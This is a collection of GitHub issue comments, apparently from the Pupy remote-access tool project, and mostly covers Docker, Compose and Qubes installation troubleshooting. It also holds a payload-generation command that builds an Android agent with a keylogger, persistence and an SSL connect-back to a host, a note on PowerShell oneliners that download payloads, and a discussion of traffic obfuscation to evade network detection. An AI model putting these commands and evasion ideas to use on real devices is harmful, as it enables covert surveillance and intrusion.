sure to include them in the above command before vsyscall=emulate.\nThis still has not solved the crashing issue.. To be specific: he is using Qubes 4, which is the latest stable release. Due to hardware incompatibility with the new version, I am using Qubes 3.2 (olstable, still updated).\nThis is the output docker after attempting to run that command:\nuser@pupy-testbed:~$ docker container ls -a\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                       PORTS               NAMES\nd8c35d2d8012        alxchk/tc-linux64   \"/bin/bash\"         14 seconds ago      Exited (139) 7 seconds ago                       test64\nIt doesn't crash the VM in this case, it just does not start, returning me to a regular bash shell instead of the container shell.\nHere is an asciinema recording of this: https://asciinema.org/a/wrCdMjhmh2dVXzKcjWD2szAdv. Sorry about the delay at the beginning.\nTo clarify: I had the same issue as him (see issue 2 on alxchk fork). The new issue I am having is that the VM crashes upon attempting to run ./create_workspace.py pupyws. It remains to be seen whether they are related.. Correction, I am stupid. I did not run the qvm-prefs command to enable vsyscall on this specific VM. After doing so, the above command executes with no errors for tc-linux64.\nuser@pupy-testbed:~$ cat /proc/cmdline \nroot=/dev/mapper/dmroot ro nomodeset console=hvc0 rd_NO_PLYMOUTH rd.plymouth.enable=0 plymouth.enable=0 nopat vsyscall=emulate\nThis is the output after fixing that problem. Testing install again now.\nEDIT: No, still crashes. For me, it crashes as soon as it says \"installing python packages\". This is likely a different issue.\nIf @AlphaMufasaOmega can test this with the new kernel option enabled via qvm-prefs, we might get somewhere.\nEDIT 2: So, to clarify as explicitly as possible:\nThere are two issues here.\n\n[+] Build sources-linux with toolchain alxchk/tc-linux64 fails with the error described above. This is universal across Qubes versions.\nThe VM crashes when it gets to \"installing python packages\".This may or may not be Qubes 3.2 specific. At the moment, I am attempting to deal with the crashing issue, as I can't even get to the first one without doing so. I am tracking my bug testing progress in detail at this wiki page.\n\nWhich issue is the above meant to fix, the crashing or the first problem?. Agreed. I will open a second one.\nThe linux64 build issue should also technically be in a separate issue, seeing as this was originally an issue about the problems with android payload connectivity.. @AlphaMufasaOmega: If you install pupy using the Docker method, it should have no issues building the APK. It still does not connect back, but it at least finishes.\n```\n\n\ngen -O android -S -o Agent-Smith_1.1.apk -s hide_argv,name=architect -s keylogger -s daemonize -s persistence,method=registry --randomize-hash connect -t ssl --host Censored:443\n[+] loading scriptlet 'hide_argv' with args {'name': 'architect'}\n[+] loading scriptlet 'keylogger' with args {}\n[+] loading scriptlet 'daemonize' with args {}\n[+] loading scriptlet 'persistence' with args {'method': 'registry'}\n[+] Generate client: android/x86\n[C] launcher: connect\n[C] launcher_args: ['-t', 'ssl', '--host', '10.137.0.33:443']\n[C] cid: 0x62482150L\n[C] debug: False\n[+] Required credentials (found):\n[+] SSL_BIND_CERT, SSL_CA_CERT, SSL_CLIENT_CERT, SSL_BIND_KEY, SSL_CLIENT_KEY\n[+] generating PY payload ...\n[+] packaging the apk ... (can take 10-20 seconds)\n/bin/sh: 1: jarsigner: not found\n[-] payload generation failed: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy_7mOC_m' pupy_key' returned non-zero exit status 127\n```\n\n\nYou say in #639 that you installed jarsigner. Is it in your PATH?. Can you run it normally, (i.e. jarsigner -h)?. > Well, docker layers quite useless, so don't expect to reduce load size. The image will be different from the point where pupy copied to the system. This includes dev packages installed to build python deps and so on. If you have idea how to make this more efficient - you can try.\nYes, but even including deps, that is 330MB. If the pupy installation was on a different layer, then each new pull would only need to download that much. That saves you 2/3 of a gigabyte. Granted, I don't know how large the python deps are, but even if you only have to pull half the current size, that is an improvement.\n\nThe idea of this docker image to have clean system from some stateless point.\n\nYes. Having pupy on another layer doesn't change that. It just saves bandwidth.\n\nIn case of active depelopment it's preferable to have non-docker deployment. Docker is more about fire-and-run\n\nThat would be great, but the Debian 9 installation process is still broken on my end. I have not tested it lately, but last I checked it was dysfunctional.. In regards to the fourth point above (docker image layering):\nI see that there was a recent commit here which looks like it may have helped with this issue. I am going based on the title, I did not sufficiently understand the actual change to evaluate it properly.\nAlso, based on the pull speed, it looks like the 250MB repo from LaZagne no longer exists. It is 5MB now. Thanks for fixing @AlessandroZ.\nIn terms of the other points: can one of you give me the privileges needed to manage/close issues? I can handle some of the administrative work for points 5 and 6 above.\nAlso, I think that we should officially support only Debian 9 and Kali. If @alxchk is in agreement, can I update the README and wiki to reflect this?. Emphasis on should. I think that this will save some headache down the line.. I am going to close this issue, as all the original points are resolved.. @alxchk: Do you mind merging this?. Ok.. This is a cosmetic error. Is there actually a problem with packet capture?. @AlphaMufasaOmega Can you please paste the exact commands you used to install jre 10.*.* and jarsigner?\nAre you installing directly from the Debian repos or from somewhere else?. On a completely unrelated note: anyone reading this who uses Qubes 3.2, can you please try to build the docker container by following the Debian 9 installation guide on the wiki here, after running: qvm-prefs -s <vm-name> kernelopts \"nopat vsyscall=emulate\"?\nI am at a complete loss as to why this VM keeps crashing. If anyone besides me can try to reproduce this issue, it would be immensely helpful.. Thank you for the detailed walkthrough. I will attempt to replicate it.\nLet's resume the conversation about the jarsigner issue over at #639.. I am going to close this, as it is no longer relevant with the new compose support and template downloading method. This will still probably remain an issue on Qubes, but only for people who want to compile the payload templates themselves, which I removed from the compose install for convenience. I may also remove it from the virtualenv install, and have it download the templates instead of compiling them.. Let me explain the rational for this:\nIn an ideal world, the pupy environment should be reproducible on any platform. This includes platforms that are not traditionally supported, (Windows, Mac, Centos, Arch, etc). Besides which, there have also been installation issues with the existing support for Debian 9. Using docker (specifically docker compose) would enable deployment on any platform that supports docker and docker compose.\nIn regards to your points:\n\n\nYou can access/edit sources easily if it is set up with compose. The idea behind this is that you would create a container with all the dependencies, and mount the pupy directory to that container. This is how compose normally works. As a result, you have the pupy directory sitting conveniently on disk, much as it normally would. It is not an impediment to development.\n\n\nYou can make pull requests with the setup described above.\n\n\nThe issue you seem to have (correct me if I am wrong) is you are assuming that everything will run how it currently runs. If pupy was run from a container as it is now, I would agree with you. To make a pull request, you would have to launch the docker container with a custom entrypoint, install git, configure it, etc. By mounting the pupy directory via compose instead, you eliminate this problem, because the entire environment is accessible outside the docker container. It is only mounted inside the container at runtime.. To clarify: Are the templates built automatically and can I download the latest versions? If so, how? I need to know how to do that.\nEDIT: After digging through the commit history for the wiki, I found this:\nbash\ngit clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule init\ngit submodule update\npip install -r pupy/requirements.txt\nwget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz\ntar xvf payload_templates.txz && mv payload_templates/* pupy/payload_templates/ && rm payload_templates.txz && rm -r payload_templates\nIs this the way to get the latest payload templates? Is this built automatically, or only with each release?\n@alxchk removed the documentation that referenced how to get the latest compiled templates. If there is an automated build system for creating them, maybe he didn't know about it? The way I assumed it worked was that they were created manually with each release (which don't happen very often), which lead to outdated compiled templates.\nThe way to get the latest templates now is to pull the latest toolchain images and build them locally. At least, that is the way we have been doing it. It is pretty inefficient in my opinion.\n\nAssuming the automated build system exists: I would like to have \"stable\" releases again, which I am willing to do regression testing on. As a result, it might make sense to distribute the compiled templates with each release again.\nAssuming this happens, the new system I am proposing is as follows:\n\nClone the pupy repository (which now contains the compiled templates)\nRun an installer script.\nThe script does the following:\nInstalls docker and docker compose\nPulls the latest pupy image (only contains dependencies required to run)\n\nTo run pupy after \"install\":\n1. Run a wrapper script in the cloned directory, which does the following:\n- Mounts the pupy directory to the docker container via docker compose\n- Starts the pupysh script.\nThis system allows for more modular usage of pupy, simplifies setup, and keeps the source code accessible outside of a docker container for development purposes.\nThe problem I have now is that the current way to get the latest templates is to compile them yourself, which requires pulling and running the toolchain images. This is a pain.. Ok, thank you for the clarification.\nI will update the install process to pull from the latest payload template release rather than needing docker to compile them each time. This will make the installation go much faster.\nHow often does travis-ci build the payload templates? I notice that it is 7 commits behind right now.\n\nRE: Docker vs. virtualenv\nI did not necessarily mean every platform, but it works on enough platforms to be viable, and it is still better than using virtualenv.\nWe have had consistent issues with installation even on Debian 9, which is now one of the officially supported OSes along with Kali. Part of this has to do with missing dependencies, which is an easy fix... but there are also problems with needing specific versions of packages. This was an issue with libssl, which was originally reported here.\nI am not necessarily saying we should get rid of virtualenv altogether, I am just saying that it shouldn't be the preferred install option. Docker compose will work 100% of the time (on supported x64 platforms) if done right, whereas I have had persistent and continual issues with virtualenv thus far, as have many other people. We should maintain documentation explaining how to install with virtualenv, but for the \"end user\" I think docker compose is the way to go.\n. I am currently working on this change. Just an update on ways to install:\n\nInstall with docker compose, pull payload templates\nInstall with docker compose, build payload templates\nInstall with virtualenv, pull payload templates\nInstall with virtualenv, build payload templates\n\nAll of these install options should be supported, but I am advocating the option 1 for most use cases.. @alxchk: Could you help me with something? I have been stuck on an issue with the paths for the docker compose image.\nWhen I am using pupy installed on bare metal, it outputs any generated payloads to ./output (i.e. the directory from which pupysh is run). When run from any kind of docker image, it outputs it to /output in the container (in the root directory). I could just mount all the directories in question to the equivalent in the root directory, but this is messy in my opinion.\nAny idea why it does this? I have played with the config to no avail.. @alxchk: the above does not resolve the issue. It is still outputting the payloads to /output in the docker container root directory. I tried several variations, including output, ./ouput, and /output. None of them change anything.\n\nAlso, where are the configs stored in docker? Looking at the Dockerfile, I see the following line: COPY conf/pupy.conf.docker /home/pupy/.config/pupy/pupy.conf. I have been methodically removing redundant or irrelevant lines from the Dockerfile, and commenting that one out makes no difference in the behavior of pupy.\nHow was pupy designed to be run in the docker container? I have been running it by specifying a custom entrypoint and executing pupysh.py in /opt/pupy. However, in the Dockerfile, it looks like pupy was meant to be launched as a shell upon logging in via SSH, (which is functionality I am removing). Does pupy still reference the config file cited above if run directly?. How would I enable logging?\nEDIT: Nevermind, I just found it.. Here is the output from that command. I have read through it and done ctrl+f, but I see no reference to a config anywhere in there. Still can't tell where it is loading the config from.\nShould I be running the config save command after each change with config set?. Ok, I have referred to the updated wiki. This is the new problem I have:\nuser@pupy-testbed:~/pupy.bak/pupy$ docker run -it --entrypoint /opt/pupy/pupysh.py -w /projects -v /tmp/projects:/projects -u pupy --name pupy2 alxchk/pupy:unstable\nTraceback (most recent call last):\n  File \"/opt/pupy/pupysh.py\", line 96, in <module>\n    credentials = PupyCredentials.Credentials()\n  File \"/opt/pupy/pupylib/PupyCredentials.py\", line 181, in __init__\n    configfile = path.join(config.get_folder('crypto'), 'credentials.py')\n  File \"/opt/pupy/pupylib/PupyConfig.py\", line 177, in get_folder\n    return self.get_path(folder, substitutions, create, True)\n  File \"/opt/pupy/pupylib/PupyConfig.py\", line 166, in get_path\n    makedirs(retfilepath)\n  File \"/usr/lib/python2.7/os.py\", line 157, in makedirs\n    mkdir(name, mode)\nOSError: [Errno 13] Permission denied: 'crypto'\nI will pull an updated docker image (as mine is relatively old) and see if that fixes it.\nNote that I have omitted the port option.. Well, the latest pull doesn't work at all apparently.\nThis error looks familiar. I have seen it before, but I am not sure where.\nThis is on the latest pull, I ran it with docker run -it --rm --entrypoint bash alxchk/pupy:unstable, and executed it in the docker container with cd /opt/pupy && ./pupysh.py\nThis is not an issue because of the way I run pupy, this also occurs when I run it with docker run -it --rm --entrypoint /opt/pupy/pupysh.py -w /projects -v /tmp/projects:/projects -u pupy --name pupy2 alxchk/pupy:unstable. This is identical to the wiki entry, only with the container name changed, the port publishing removed, and the --rm option added.\nAt some point during one of the recent commits, the docker image seems to have broken.. Well, the latest commit on your fork seems to have fixed the impacket issue.\nWhen I attempt to generate payloads, I am seeing it output to this path: /opt/pupy/output/. Assuming this works with compose, the path issue should be solved. I will test it and report back.\nEDIT: No progress. Still outputting payloads to /output in the root directory when payloads are generated with the compose version. I suspect this is an issue with the config file. All changes I have made are on my fork.\nComparing the output from debug loglevel on start, from the regular docker container I see this:\n2018-09-24 09:48:20,335| Loading config from /opt/pupy/pupy.conf.default:/opt/pupy/pupy.conf:/root/.config/pupy/pupy.conf:config/pupy.conf:pupy.conf\n2018-09-24 09:48:20,337| Loading config from /opt/pupy/pupy.conf.default:/opt/pupy/pupy.conf:/root/.config/pupy/pupy.conf:config/pupy.conf:pupy.conf\nWhat do the colons mean? Does this mean it is loading the config file from each location depending on if they exist? I.e. would it first check /opt/pupy/pupy.conf.default, then /opt/pupy/pupy.conf, etc?. @n1nj4sec Completely unrelated issue: at what intervals are the payload templates built for the release page? I want to have the docker image pull them from there, but the last build was 20 days ago. If the release page isn't updated automatically, then the compiled payload templates will get increasingly out of date.\nIs it automatic?. @alxchk Ok, they do seem to have been compiled recently. The date on the release page is listed as 20 days ago, but that must be inaccurate.\nI have solved the path issue, it seems to have been on the compose side. Apparently, I needed to define a workdir in the dockerfile.\nI do need an answer to the config question though, because I am trying to remove all the old SSH related lines from the dockerfile. That includes the config file in /home/pupy/.config, and basically anything that is an artifact of pupy being a login shell. \nI would like to remove all of the following lines from the dockerfile:\n```\nRUN useradd -m -d /home/pupy -s /bin/bash pupy\nRUN mkdir -p /var/run/sshd /home/pupy/.config/pupy /home/pupy/.ssh /projects\nRUN ln -sf /projects/keys/authorized_keys /home/pupy/.ssh/authorized_keys\nCOPY conf/pupy.conf.docker /home/pupy/.config/pupy/pupy.conf\nCOPY conf/.bashrc /home/pupy/.bashrc.pupy\nCOPY conf/capability.conf /etc/security/capability.conf\n[...]\nRUN chown pupy:pupy -R /home/pupy; chmod 700 /home/pupy/.ssh\nRUN echo 'source /home/pupy/.bashrc.pupy' >> /home/pupy/.bashrc\n```\nWill removing any of those break anything? The only lines I am unsure about removing are the COPY ones, especially COPY conf/capability.conf /etc/security/capability.conf, because I don't know what it does.. I have removed everything except the capability.conf line. Based on preliminary testing, it has not broken anything (I started pupy, and ran gen connect).\nThe reason why I am removing all the SSH lines is because it was a bad way to do it in the first place. Docker is meant to be run as a single application per container, and the SSH component needlessly complicates it. The compose system is simply a superior way to deploy pupy.\nI have just tested my revisions on a fresh VM. I have automated all of the installation steps: there is now a single script to install docker, docker compose, and pull the pupy image. All changes are on my fork.\nThe only thing that doesn't work is docker without sudo. Need to add the step to add the regular user to the docker group.. Why would you have SSH in the Docker container though? You are already connected to the VPS via SSH anyway, what is so different about logging in and starting it with compose as opposed to connecting to it directly? The whole system is unnecessarily complicated.\nAs far as config files go, if I remove the COPY conf/pupy.conf.docker /home/pupy/.config/pupy/pupy.conf line, what difference does it make? Won't it fall back to the local pupy.conf.default file? I think it would, based on the below log message:\n2018-09-24 09:48:20,335| Loading config from /opt/pupy/pupy.conf.default:/opt/pupy/pupy.conf:/root/.config/pupy/pupy.conf:config/pupy.conf:pupy.conf\nThere is no reason whatsoever why it should work from an unprivileged user in a docker container. On a regular installation (bare metal), that makes sense. In Docker, there is no point.. > Because \"regular\" user should not he able to control dockerd.\nThey already can control dockerd, that is part of the installation instructions, (usermod -aG docker user).\n\nLeast privileges principle.\n\nAfter doing some research on docker security vulnerabilities, I think you are right about this. Given that docker has access to the underlying kernel, root privileges increase the attack surface. I had been thinking about it more like this, which seems to be incorrect. So, it would be better to leave in the lines about unprivileged user creation, and set docker to start pupy as that unprivileged user as you had previously done.\n\nAnyway, there can be different threat models. Personally I have reason to like this one, but I'm not against to add more options. To add, not to replace.\n\nYou have a point. Even if I add it though, I still think the compose method should be the standard way to deploy.\nThat being said, I still disagree with the SSH part. In an attack scenario, they are attacking an SSH server in both cases, whether the server is running in a container or not. Assuming both are running as unprivileged users, the attacker gets the same things: access to pupy. They can either interact with it directly (if the SSH server is in container), or they can attach to the container and interact with it. There is no security benefit to using SSH within a container, and it adds complexity.. > The user who access the container via SSH and user who maintains the system may/should be different in this case. User who has access to docker can/may escalate privileges.\nEDIT: There was a long monologue about why it is bad to run SSH in container here. You are right though, there are different use cases.\n\nWe can move Dockerfiles to some \"recipes\" folder and add scripts to select/use any from that set.\n\nAgreed about the recipes folder. Another note on architecture: I think we should have two different docker images. There is the one we have now, alxchk/pupy:unstable, and there should also be alxchk/pupy:base. The second one should be built using the modified dockerfile I have created, and should contain only the dependencies of pupy, not the actual installation.. @alxchk: I have created a pull request on your fork. Compose support is implemented. This should make pupy a lot less confusing for people who don't know docker.. Seeing as compose is implemented, I am going to close this issue.. Did you try installing openjdk as @alxchk recommended over at #639?. If you are testing this on Debian 9, this may be a dependency issue.\nThe dependencies listed in the wiki are not the complete set required to run pupy in all circumstances, (as jarsigner shows pretty clearly).\nLook at the dockerfile in the pupy directory, (where pupysh is). One of the lines in there lists all the dependencies that the docker image installs. Try installing all of them, and then report back.. If you are testing this on Debian 9, this may be a dependency issue.\nThe dependencies listed in the wiki are not the complete set required to run pupy in all circumstances, (as jarsigner shows pretty clearly).\nLook at the dockerfile in the pupy directory, (where pupysh is). One of the lines in there lists all the dependencies that the docker image installs. Try installing all of them, and then report back.. Thank you for your contribution.\nIf convenient, please feel free to edit the wiki. I originally created that page when I was doing testing a while back. If you want to create a new wiki page using that one as a template, feel free.\nAt some point in the future, we are going to have to create a stable, \"frozen\" release, where we will do all the regression testing. At that point, we will have to test every module to ensure it works.\nThanks for your help in the mean time though :). I don't recognize the UI your are using. Is that Rancher?\nSorry about the confusion, the documentation is still kind of a mess. I am working on revamping the docker container to be easier to use, and the documentation does not adequately reflect that.\nThe docker container was originally designed to be connected to via SSH, which was a poor design decision IMO, (no offense alxchk). As a result, the script it starts is the one for generating the SSH keys, and to actually use it you must specify a custom entrypoint.\nPlease refer to the documentation on the wiki here. It gives a working overview of how to set it up, (note that this was tested on Debian 9, with the docker command line, please adapt to your platform).. I am not familiar with how this worked in older versions. What are you trying to do?\nPlease refer to the Contribution Guidelines, especially the part about grammar. If you can, please try to be more specific, and write in properly formatted sentences.. @currymygod Are you running the pupy server on Centos? If you are, please be aware that Centos is not a supported operating system.\nAlso, please follow the contribution guidelines.\n\ni need help now..... please help me to solve the ploblem\n\nThis is not an effective issue. You need to be very specific, otherwise you are wasting both our time and yours. In order for us to help you, you have to read and follow the guidelines.. I would suggest a default setting, as well as a way to configure it per client. This is the way Empire handles it.. @passwordleak: Sorry about the \"docker bullshit\". Docker has been a total mess for a while, and I didn't really maintain the wiki page about it properly.\nPart of the reason for this is that I wanted to use docker compose instead of just docker. This should make it less confusing for people who don't know docker. Up until now, compose support hasn't been implemented. Luckily for you, I just finished it yesterday.\nI have implemented compose on my fork. I am waiting for @alxchk to merge it upstream. In the mean time though, try cloning that repo. The new install procedure is:\n\nRun ./install.sh in the pupy folder. This should install docker and docker compose. It will also pull the payload templates and build the base docker image.\nRun ./pupy_start_compose.sh in the pupy subdirectory. This should spawn a pupy shell.\nType exit to close pupy. You can also background pupy by hitting ctrl+pq. To attach to it again, type docker attach pupy. Hit enter a few times to get the pupy prompt.\n\nThis has been tested on Debian 9. I will test it on a Kali VM now and see if I encounter any issues with it.\nNote that this information is subject to change. For the latest information, please refer to the wiki.. First, please refer to the contribution guidelines in the wiki, especially the part about properly formatting code blocks. I would recommend creating a gist for output that long.\nRegarding the actual issue: if you are running pupy using docker or docker compose, there is additional configuration required to expose the necessary ports (in this case ports 8080 and 443). \nHow are you running pupy? Have you explicitly configured a listener for that port?. @alxchk I am commenting on this issue because the UID variable issue is still present in the latest commit on the master branch. Not sure what caused the regression.. Scramblesuit has been outdated for a while now. The evaluation here indicates that it has been superseded by obfs4. I don't think scramblesuit is broken per se, but it is not the standard for Tor bridges anymore because obfs4 is better.\nThere is an argument to be made for the importance of traffic obfuscation. Most of Pupy's transports stand out compared to regular network traffic (SSL excepted). In general, I think SSL is a better way to handle DPI, but it is nice to have the obfs4 alternative.\nThat being said, scramblesuit isn't broken, and implementing new features is time consuming. @alxchk can implement it if he has the time/inclination, but personally I don't consider it a high priority.. Interesting read.\n\nObfs4 improves ScrambleSuit by providing the same security properties as ScrambleSuit but also includes an authenticated key exchange via BridgeDB. [...] The fact that obfs4 also provides authenticity which ScrambleSuit does not, also makes this protocol sound against active Man In the Middle Attacks by the Agent that controls the network.\n\nBased on my reading of this, it sounds like the obfs4 modifications to scramblesuit were mainly that they added authentication via the elliptic curve public key. This was mainly to prevent active probing, where an adversary tries to connect to the bridge and see if it responds like a Tor node.\nIn theory, the lack of authentication in scramblesuit makes this easier to do. So, (for instance) if a target on an engagement wanted to know if the traffic leaving their network was using scramblesuit for obfuscation, they could potentially find out by actively probing the Pupy server, to see if it accepts the scramblesuit handshake. Granted, this is still difficult because of the time based element in this protocol, but it might be possible in theory.\nThe question becomes: is there a tool for fingerprinting scramblesuit with active probing, is it integrated into any enterprise network monitoring/security tools, and is it well known enough that blue team might actually deploy it?\nAssuming there is a NIDS that is actually doing this by default, (probably not if it involves active probing, for legal reasons), then you are screwed. The likelihood of that being the case is slim, IMO.\nThoughts?. If it is a simple protocol whitelist/blacklist, it might be worth looking into the FTE transport. It was rejected from Tor due to a lack of research and auditing, but in this case it isn't a life or death situation, and it is able to mimic many common protocols. They also claim it can \"learn\" to mimic uncommon protocols by analyzing packet samples.\nNot sure on the details of any of this, but it could be worth looking into.\nIf obfs4 is off the table, I recommend closing this issue.. @n1nj4sec Where is the source code for the audio transport? That is very similar to what BadBIOS was doing if I recall.\nhttps://en.wikipedia.org/wiki/BadBIOS\nEven if it isn't useful, it would be cool for PoC/demo purposes.. That was my thinking. It is infeasible for me to test all versions of any given operating system, both because of the sheer amount of work involved and the lack of resources on my end. All the same, we should at least know that pupy works on some of the more common platforms.\nTo start, we should choose currently maintained platforms, (i.e. Windows 7 and up, whichever kernel versions still have long term support for Linux via something like oldstable). Windows XP is no longer maintained, not sure about Vista off the top of my head. We should also choose common processor architectures. It is rare to see x86 processors in recently made computers. I know that there are specialized servers, VMs, phone operating systems, etc... But for most bare metal installations, it is getting increasingly rarer to see x86 except in legacy environments. Even when virtualized, there is no reason to run x86 over x64. For this reason, I propose we do testing on x64 hardware only to start.\nI would avoid testing with SELinux and AppArmor. Those are fairly specialized environments, and I can imagine that being a major headache. Furthermore, configurations for those tools differ. Sure, you could use default AppArmor profiles, but depending on whether they are implemented by the distro itself rather than installed by the user, there can be some configuration differences. If they are installed by the user, you have to deal with however the user has configured them. If an admin is paying enough attention to install these tools in the first place, you are looking at something that may require a custom solution, and I don't think it is incumbent on pupy to provide it.\nBased on this, I would change the list as follows:\n(Note: testing the different editions is pointless IMO. I would choose Professional or whatever the newer equivalent is for all Windows versions).\n\nWindows 7 x64\nWindows 8.1 x64\nWindows 10 x64\nCurrent Windows Server versions\nDebian oldstable\nDebian stable\nDebian testing\n\nThe same should be done for Redhat based distros, especially considering the bias towards RHEL in certain industries.\nWe may be able to automate this after a fashion. Is there something in pupy that can tell if a command succeeded or failed, (i.e. return codes in bash, zero and nonzero)? If so, we can simply have it run through all the general commands and report which ones failed, (i.e. info, persistence, etc). This will not stop the commands from failing at the remote end (for example, message box failing to pop up even though pupy executes it normally on the server), but it can tell us which ones are obviously broken.. Ok, then @n1nj4sec, can you give me permissions?\nOn an unrelated topic, we should have an issue template, much like Empire does. The issue a series of questions automatically filled in, (i.e. what platform are you running, what OS, etc.) In addition to just deleting old issues, can I have permission to create that, or can one of you? I am having to paste the \"issue guidelines\" wiki page in a lot.\nEDIT: The issue template can be added via pull request. I will do that when I get a chance.. Please see issue guidelines for information about opening issues, especially how to format commands and output, and the environment information.\nWe need more information before we can help you. Again, refer to the issue guidelines.\nFor instance, how have you installed Pupy? On what platform? What commit?\nThis may be an issue with whatever environment you are using. Compose will have issues with port forwarding, it needs extra configuration. Virtualenv has dependency issues sometimes.\nAssuming it is not a port forwarding issue:\nPowershell oneliners (in general) run by connecting back to the server to download the actual payload. The oneliner is NOT the payload. Because it has already executed, the http server it downloads the payload from will have shut down. So, if you try to execute it again, there will be no server to download the payload from.\nYou will need to generate a new oneliner each time you need to execute it, which will restart the http server it downloads the payload from.. Ok, so you installed via virtualenv. I explained the solution to the oneliner problem above. Please read it carefully.\nEDIT:\n\nHow can i use only a server created with pupysh, without the server make by ./pupygen -f ps1_oneliner ?\n\nIf I understand, you want to generate a oneliner without pupygen? If so, please use the gen command in pupysh. It does the exact same thing as pupygen, except without having to exit the shell.. Pupy does not have specific support for OSX with a platform specific payload, but it should work anywhere python does. You will have to use one of the python based payloads.\nTo see all available payload formats, please run gen -h from pupysh.\n-f {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}, --format {client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky}. @alxchk: This actually should work... Not sure why it doesn't. Is the keylogger platform specific? Does OSX implement keyboard input differently than other Unix OSes?. It might be a good idea to implement this at some point. It is a pretty simple feature, not sure how hard it would be on Mac though. May take a look at this if I get a chance.. Need more information. How is your environment set up? Is this a docker install?\nCan you generate other types of payloads? If not, you probably didn't pull the payload templates during install.\nAlso note: Android and Mac support are to be considered in an alpha state, and are thus unreliable. Do not rely on Pupy for those use cases.. If you are using docker compose (see the wiki for installation steps), then it should automatically pull the payload templates.. Android functionality is essentially broken.. No. Android is broken. The feature does not work.. Last I heard of it, it was completely broken. I and one other person had issues creating the APK, and even when it worked, the payload never connected back.\nMaybe it has been fixed since I tested it, but last I checked it was broken.\nFurthermore, the Android and Mac functionality is really underdeveloped. I feel like there needs to be a disclaimer about it in the README or something. Even if it isn't broken, there is just a lot of stuff that isn't implemented that should be (i.e. Mac keylogger). If this is the case, there should be a disclaimer about it so we don't have to keep answering questions.. ",
    "AlphaMufasaOmega": "good suggestion!. dont forget that the command line commands change slightly depending on the type of linux operating system you are usinf it changes between debian and fedora (.rpm verses other setups). it looks like an error in memory.. not enough space on disk, maybe ram as w ell definetly on disk. i believe this has to do with reinstalling the jdk 10 or jarsigner specifically try these instructions https://linuxhint.com/install-openjdk-10-debian-9-stretch/ or install jarsigner individually using command line  terminal... i had this error and ifixed it. i manually installed each package for requirements.txt and my pupy setup is more stable than the recent docker image i think... at least so far :/. maybe delete credentials.py in pupy/pupy/crypto. using sudo rm -rf credentials.py\n. I jave a similiar problem when I am trying to generate a payload... i reinstalled jdk-10.0.2 but it still isn't working I get the following:\n```\n/bin/sh: 1: jarsigner: not found\n[-] payload generation failed: Command 'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '/tmp/tmp_pupy_vHVQbg' pupy_key' returned non-zero exit status 127\n``. I thin I have t o reinstall jarsigner manually or somehow add it to$PATH` i solved this problem once I think.... I am having the exact same issue as the man above me. I am having the exact same issue as the man above me, also I am trying to figure out how to stack protocols and get the dnscnc working. I Understand you guys do an amazing job!. how do i access the pushed updated version is it a command line command? or should i just download a .zip and reinstall?. i will do my best to upload logs!. that makes alot of sense... i totally understand that now! i think my architecture is just arm 7 like you said... i am still testing i will let you know I am running it in a debian-9 VM inside qubes 4.0 and my phone is a rooted galaxy s7 android aarch64 Processor rev 2 (aarch64) OS version Nougat (7.0) java VM ART 2.1.0 Model SM-G930U\nalso I am running my pupysh inside a vm in a hypervisor... do you think that would destroy my networking when i am generating payloads and connecting servers\nit is still generating the same behavior it says hello from pupy but then it does not appear in sessions in sudo ./pupysh.py. <<<<<<<<----------------------------- these are my internet connections I believe\n```\nuser@DebianCENSORED:~/pupy$ sudo ifconfig\ndocker0: flags=4099  mtu 1500\n        inet censored ip  netmask censored ip  broadcast censored ip\n        ether 02:42:36:98:66:b5  txqueuelen 0  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\neth0: flags=4163  mtu 1500\n        inet censored ip  netmask censored ip broadcast censored ip\n        inet6 fe80::216:3eff:fe5e:6c00  prefixlen 64  scopeid 0x20\n        ether 00:16:3e:5e:6c:00  txqueuelen 1000  (Ethernet)\n        RX packets 200200  bytes 227652835 (217.1 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 94034  bytes 7536325 (7.1 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nlo: flags=73  mtu 65536\n        inet  censored ip  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 1759  bytes 3899528 (3.7 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 1759  bytes 3899528 (3.7 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\nuser@DebianCENSORED:~/pupy$ \n<<<<<<<<----------------------------- these are my internet connections I believe. <<<<<<<---------------strange possible cosmetic error also noticed\nsudo ./pupysh.py -l ssl 10.137.0.30:443 --loglevel DEBUG\nNo handlers could be found for logger \"pupy.network.pss\"\n. essentially it is running in a debian-9 Vm inside Qubes 4.0 hypervisor I did \nsudo git clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\nsudo git submodule init\nsudo git submodule update\nat this point i attempted to do sudo pip install -r requirements.txt it wouldn't let me due to errors(e.g.\nInstalling collected packages: KCP\n  Found existing installation: KCP 1.0.1\n    Can't uninstall 'KCP'. No files were found to uninstall.\n  Running setup.py develop for KCP\n    Complete output from command /usr/bin/python -c \"import setuptools, tokenize;file='/home/user/pupy/pupy/external/pykcp/setup.py';f=getattr(tokenize, 'open', open)(file);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, file, 'exec'))\" develop --no-deps:\n    running develop\n    running egg_info\n    writing KCP.egg-info/PKG-INFO\n    writing top-level names to KCP.egg-info/top_level.txt\n    writing dependency_links to KCP.egg-info/dependency_links.txt\n    reading manifest file 'KCP.egg-info/SOURCES.txt'\n    writing manifest file 'KCP.egg-info/SOURCES.txt'\n    running build_ext\n    building 'kcp' extension\n    x86_64-linux-gnu-gcc -pthread -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fno-strict-aliasing -Wdate-time 